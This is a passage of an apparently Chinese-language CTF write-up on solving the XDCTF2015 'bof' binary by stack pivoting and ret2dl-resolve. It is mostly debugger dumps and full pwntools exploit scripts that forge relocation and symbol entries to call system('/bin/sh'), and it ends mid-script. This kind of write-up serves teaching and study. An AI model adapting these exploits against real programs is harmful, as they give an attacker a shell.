<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x17</span> bytes:</span><br><span class="line">    'Welcome to XDCTF2015~!\n'</span><br><span class="line">[DEBUG] Sent <span class="number">0x75</span> bytes:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    *</span><br><span class="line">    <span class="number">00000060</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span>  <span class="number">40</span> a8 <span class="number">04</span> <span class="number">08</span>  │aaaa│aaaa│aaaa│@···│</span><br><span class="line">    <span class="number">00000070</span>  <span class="number">58</span> <span class="number">84</span> <span class="number">04</span> <span class="number">08</span>  <span class="number">0</span>a                                     │X···│·│</span><br><span class="line">    <span class="number">00000075</span></span><br></pre></td></tr></table></figure>

<p>发送payload后，EBP已经被覆盖为我们布置好的FakeStack地址了，也就bss段地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x75</span></span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  0xffe1207c ◂— 0x61616161 ('aaaa')</span><br><span class="line"> EDX  <span class="number">0x100</span></span><br><span class="line"> EDI  <span class="number">0xffe12160</span> —▸ <span class="number">0xffe12180</span> ◂— <span class="number">0x1</span></span><br><span class="line"> ESI  <span class="number">0xf7ef7000</span> (_GLOBAL_OFFSET_TABLE_) ◂— <span class="number">0x1b1db0</span></span><br><span class="line"> EBP  <span class="number">0x804a840</span> ◂— <span class="number">0x0</span></span><br><span class="line"> ESP  <span class="number">0xffe120ec</span> —▸ <span class="number">0x8048458</span> (deregister_tm_clones+<span class="number">40</span>) ◂— leave  </span><br><span class="line"> EIP  <span class="number">0x804851e</span> (vuln+<span class="number">51</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   <span class="number">0x8048519</span> &lt;vuln+<span class="number">46</span>&gt;                    add    esp, <span class="number">0x10</span></span><br><span class="line">   <span class="number">0x804851c</span> &lt;vuln+<span class="number">49</span>&gt;                    nop    </span><br><span class="line">   <span class="number">0x804851d</span> &lt;vuln+<span class="number">50</span>&gt;                    leave  </span><br><span class="line"> ► <span class="number">0x804851e</span> &lt;vuln+<span class="number">51</span>&gt;                    ret             &lt;<span class="number">0x8048458</span>; deregister_tm_clones+<span class="number">40</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048458</span> &lt;deregister_tm_clones+<span class="number">40</span>&gt;    leave  </span><br><span class="line">   <span class="number">0x8048459</span> &lt;deregister_tm_clones+<span class="number">41</span>&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   <span class="number">0x804845b</span> &lt;deregister_tm_clones+<span class="number">43</span>&gt;    nop    </span><br><span class="line">   <span class="number">0x804845c</span> &lt;deregister_tm_clones+<span class="number">44</span>&gt;    lea    esi, [esi]</span><br><span class="line">   <span class="number">0x8048460</span> &lt;register_tm_clones&gt;         mov    eax, <span class="number">0x804a028</span></span><br><span class="line">   <span class="number">0x8048465</span> &lt;register_tm_clones+<span class="number">5</span>&gt;       sub    eax, <span class="number">0x804a028</span></span><br><span class="line">   <span class="number">0x804846a</span> &lt;register_tm_clones+<span class="number">10</span>&gt;      sar    eax, <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p> ret地址为leave ret的地址，将EBP的值交给ESP从而达到栈迁移 ，此时ESP已经bss段上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0x75</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xffe1207c ◂— 0x61616161 (&apos;aaaa&apos;)</span><br><span class="line"> EDX  0x100</span><br><span class="line"> EDI  0xffe12160 —▸ 0xffe12180 ◂— 0x1</span><br><span class="line"> ESI  0xf7ef7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0</span><br><span class="line"> EBP  0x0</span><br><span class="line"> ESP  0x804a844 ◂— 0x0</span><br><span class="line"> EIP  0x8048459 (deregister_tm_clones+41) ◂— ret    </span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   0x8048519 &lt;vuln+46&gt;                    add    esp, 0x10</span><br><span class="line">   0x804851c &lt;vuln+49&gt;                    nop    </span><br><span class="line">   0x804851d &lt;vuln+50&gt;                    leave  </span><br><span class="line">   0x804851e &lt;vuln+51&gt;                    ret    </span><br><span class="line">    ↓</span><br><span class="line">   0x8048458 &lt;deregister_tm_clones+40&gt;    leave  </span><br><span class="line"> ► 0x8048459 &lt;deregister_tm_clones+41&gt;    ret    &lt;0&gt;</span><br></pre></td></tr></table></figure>

<p>查看一下栈的情况，已经实现了栈迁移</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">30</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ esp  <span class="number">0x804a844</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br></pre></td></tr></table></figure>

<p>但是我们是想要让我们布置好的数据在这个<strong>fake stack</strong>上 </p>
<ul>
<li><p>我们就需要先到用<strong>read</strong>函数向这个地方写入<strong>ROP</strong>链从而能实现调用。因为又<strong>leave ret</strong>会有一个<strong>pop ebp</strong>所以在布置<strong>fake stack</strong>的时候我首先要输入对应大小的<strong>fake_ebp</strong></p>
</li>
<li><p>将我们要用到的<strong>ROP</strong>链布置到<strong>bss</strong>段上从而实现布置更长的<strong>ROP</strong>链。这样我们就知道如何去 控制我们需要的指令了</p>
<p>接着我们需要做的就是通过实现<strong>return-to-dl-resolv</strong>实现<strong>get shell</strong> </p>
</li>
<li><p>首先控制到PLT[0]修改我们函数的<strong>index_offset</strong>让其指向我们构造的<strong>fake_reloc</strong> </p>
</li>
<li><p>控制<strong>index_offset</strong> 的关键是我们只需要在<strong>PLT[0]</strong>的下一个栈地址放上<strong>index_offset</strong>就行 （因为<strong>index_offset</strong>是在<strong>call</strong>函数后<strong>Push</strong>进栈的地址刚好在返回<strong>PLT[0]</strong>时的栈顶） </p>
</li>
</ul>
<p>我们先写一个Exploit尝试在假栈上部署一下数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(base_stage) </span><br><span class="line">payload += p32(read_plt)  </span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)  </span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage+<span class="number">4</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">cmd = <span class="string">"/bin/sh"</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span> <span class="comment"># write's index</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(len(cmd))</span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里有个坑两次payload不能发送太快，需要sleep或者pause一下，否则会当作一次输入</p>
</blockquote>
<p>一直运行直到ESP被修改为假栈</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────</span><br><span class="line"> EAX  <span class="number">0x64</span></span><br><span class="line"> EBX  <span class="number">0x0</span></span><br><span class="line"> ECX  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"> EDX  <span class="number">0x64</span></span><br><span class="line"> EDI  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"> ESI  <span class="number">0x0</span></span><br><span class="line"> EBP  <span class="number">0x8048380</span> ◂— push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"> ESP  <span class="number">0x804a848</span> ◂— <span class="number">0x20</span> <span class="comment">/* ' ' */</span></span><br><span class="line"> EIP  <span class="number">0x8048459</span> (deregister_tm_clones+<span class="number">41</span>) ◂— ret    </span><br><span class="line">───────────────────────────────────────────[ DISASM ]────────────────────────────────────────────</span><br><span class="line">   <span class="number">0x804861b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;         pop    ebp</span><br><span class="line">   <span class="number">0x804861c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x804861b</span> &lt;__libc_csu_init+<span class="number">91</span>&gt;         pop    ebp</span><br><span class="line">   <span class="number">0x804861c</span> &lt;__libc_csu_init+<span class="number">92</span>&gt;         ret    </span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x8048458</span> &lt;deregister_tm_clones+<span class="number">40</span>&gt;    leave  </span><br><span class="line"> ► <span class="number">0x8048459</span> &lt;deregister_tm_clones+<span class="number">41</span>&gt;    ret    &lt;<span class="number">32</span>&gt;</span><br></pre></td></tr></table></figure>

<p> 这个时候已经在fake stack上布置好了ROP链</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x804a840</span></span><br><span class="line">00:0000│ ecx edi  0x804a840 ◂— 0x41414141 ('AAAA')</span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>│          <span class="number">0x804a844</span> —▸ <span class="number">0x8048380</span> ◂— push   dword ptr [<span class="number">0x804a004</span>]</span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>│ esp      <span class="number">0x804a848</span> ◂— <span class="number">0x20</span> <span class="comment">/* ' ' */</span></span><br><span class="line">03:000c│          0x804a84c ◂— 0x41414141 ('AAAA')</span><br><span class="line"><span class="number">04</span>:<span class="number">0010</span>│          <span class="number">0x804a850</span> ◂— <span class="number">0x1</span></span><br><span class="line">05:0014│          0x804a854 —▸ 0x804a890 ◂— '/bin/sh'</span><br><span class="line"><span class="number">06</span>:<span class="number">0018</span>│          <span class="number">0x804a858</span> ◂— <span class="number">0x7</span></span><br><span class="line">07:001c│          0x804a85c ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/sh'</span><br></pre></td></tr></table></figure>

<p>接下来部署真实的ROP链，再复习一下 _dl_runtime_resolve的过程</p>
<ol>
<li>用<strong>link_map</strong>访问.<strong>dynamic</strong>，取出.<strong>dynstr</strong>, .<strong>dynsym</strong>, <strong>.rel.plt</strong>的指针</li>
<li><strong>.rel.plt + 第二个参数</strong>求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></li>
<li><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为.<strong>dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></li>
<li><strong>.dynstr + sym-&gt;st_name</strong>得出符号名字符串指针</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给<strong>*rel-&gt;r_offset</strong>，即<strong>GOT</strong>表</li>
<li>调用这个函数 </li>
</ol>
<p><strong>_dl_runtime_resolve</strong>在第二步时</p>
<blockquote>
<p><strong>.rel.plt</strong> + 第二个参数求出当前函数的重定位表项<strong>Elf32_Rel</strong>的指针，记作<strong>rel</strong></p>
</blockquote>
<p>这个时候，<strong>_dl_runtime_resolve</strong>并没有检查<strong>.rel.plt</strong> + 第二个参数后是否造成越界访问，所以我们能给一个很大的<strong>.rel.plt</strong>的<strong>offset</strong>（64位的话就是下标），然后使得加上去之后的地址指向我们所能操纵的一块内存空间，比方说<strong>.bss</strong></p>
<p>然后第三步</p>
<blockquote>
<p><strong>rel-&gt;r_info &gt;&gt; 8</strong>作为<strong>.dynsym</strong>的下标，求出当前函数的符号表项<strong>Elf32_Sym</strong>的指针，记作<strong>sym</strong></p>
</blockquote>
<p>所以在我们所伪造的<strong>Elf32_Rel</strong>，需要放一个<strong>r_info</strong>字段，大概长这样就行<strong>0xXXXXXX07</strong>，其中<strong>XXXXXX</strong>是相对<strong>.dynsym</strong>表的下标，注意不是偏移，所以是偏移除以<strong>Elf32_Sym</strong>的大小，即除以<strong>0x10</strong>（32位下）。然后这里同样也没有进行越界访问的检查，所以可以用类似的方法，伪造出这个<strong>Elf32_Sym</strong>。至于为什么是<strong>07</strong>，因为这是一个导入函数，而导入函数一般都是<strong>07</strong>，所以写成<strong>07</strong>就好</p>
<p>然后第四步</p>
<blockquote>
<p><strong>.dynstr + sym-&gt;st_ame</strong>得出符号名字符串指针</p>
</blockquote>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/image003.jpg" alt="img"></p>
<ul>
<li><p>我们可以控制<strong>index_offset</strong>所以指向这个<strong>fake_stack</strong>上的一个位置即为我们布置的<strong>fake_reloc</strong></p>
<ul>
<li><p>需要通过计算得到<strong>index_offset</strong> 的值， 计算公式为：我们布置的<strong>fake_reloc</strong> 的地址 - <strong>rel.plt</strong> 的真实地址</p>
</li>
<li><p><strong>fake_reloc</strong>的结构，<strong>r_offset</strong>是函数 的 .<strong>got.plt</strong> 的地址 </p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr    r_offset;</span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>让我们要做的是让<strong>fake_reloc</strong> 的<strong>r_info</strong> 指向 <strong>fake_sym</strong> 结构体</p>
<ul>
<li><p>计算方法为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">align = <span class="number">0x10</span>-(( fake_sym_addr - .dynsym ) &amp;<span class="number">7</span> );</span><br><span class="line">fake_sym_addr = fake_sym_addr + align ;</span><br><span class="line">index_dynsym = (fake_sym_addr - .dynsym )/<span class="number">0x10</span>;</span><br><span class="line">r_info = (index_dysym&lt;&lt;<span class="number">8</span>) | <span class="number">0x7</span>    <span class="comment">//保证这最后一字节为 0x07</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>劫持程序到<strong>fake_sym</strong>之后我们要做的就是让<strong>fake_sym</strong>指向我们定义的 <strong>.dynstr</strong> 中的对应函数字符串。一般<strong>fake_sym</strong>我们构造的结构为<strong>fake_sym = p32(st_name) + p32(0) + p32(0) +  p32(0x12)</strong>  ，<strong>st_name</strong>就是我们保存我字符串的地址</p>
<figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment">//0x10 刚好为fake_sym的大小刚好让 函数字符串 保存在这个位置。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>让这个字符串为我们需要的如：<strong>system</strong> 那我们之后就能调用<strong>write</strong>从而调用<strong>system</strong> </p>
</li>
</ul>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/QQ%E5%9B%BE%E7%89%8720191015221035.png" alt></p>
<p>最终的Exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment">#pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span> <span class="comment">#pop ebp ; ret</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment">#leave ; ret</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S pwn1 | grep ".bss"</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment">#readelf -S</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">payload = <span class="string">'A'</span> * offset</span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">fake_dynstr = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(fake_dynstr) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">'AAAA'</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += <span class="string">'aaaa'</span></span><br><span class="line">payload2 += fake_reloc</span><br><span class="line">payload2 += <span class="string">'B'</span> * align</span><br><span class="line">payload2 += fake_sym</span><br><span class="line">payload2 += <span class="string">"system\x00"</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line">payload2 += <span class="string">'A'</span> * (<span class="number">100</span> - len(payload2))</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>还有一种使用ROP模块写的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">'main'</span>)</span><br><span class="line">r = process(<span class="string">'./main'</span>)</span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## stack pivoting to bss segment</span></span><br><span class="line"><span class="comment">## new stack size is 0x800</span></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"><span class="comment">### padding</span></span><br><span class="line">rop.raw(<span class="string">'a'</span> * offset)</span><br><span class="line"><span class="comment">### read 100 byte to base_stage</span></span><br><span class="line">rop.read(<span class="number">0</span>, base_stage, <span class="number">100</span>)</span><br><span class="line"><span class="comment">### stack pivoting, set esp = base_stage</span></span><br><span class="line">rop.migrate(base_stage)</span><br><span class="line">r.sendline(rop.chain())</span><br><span class="line"></span><br><span class="line"><span class="comment">## write sh="/bin/sh"</span></span><br><span class="line">rop = ROP(<span class="string">'./main'</span>)</span><br><span class="line">sh = <span class="string">"/bin/sh"</span></span><br><span class="line"></span><br><span class="line">plt0 = elf.get_section_by_name(<span class="string">'.plt'</span>).header.sh_addr</span><br><span class="line">rel_plt = elf.get_section_by_name(<span class="string">'.rel.plt'</span>).header.sh_addr</span><br><span class="line">dynsym = elf.get_section_by_name(<span class="string">'.dynsym'</span>).header.sh_addr</span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">'.dynstr'</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"><span class="comment">### making fake write symbol</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span 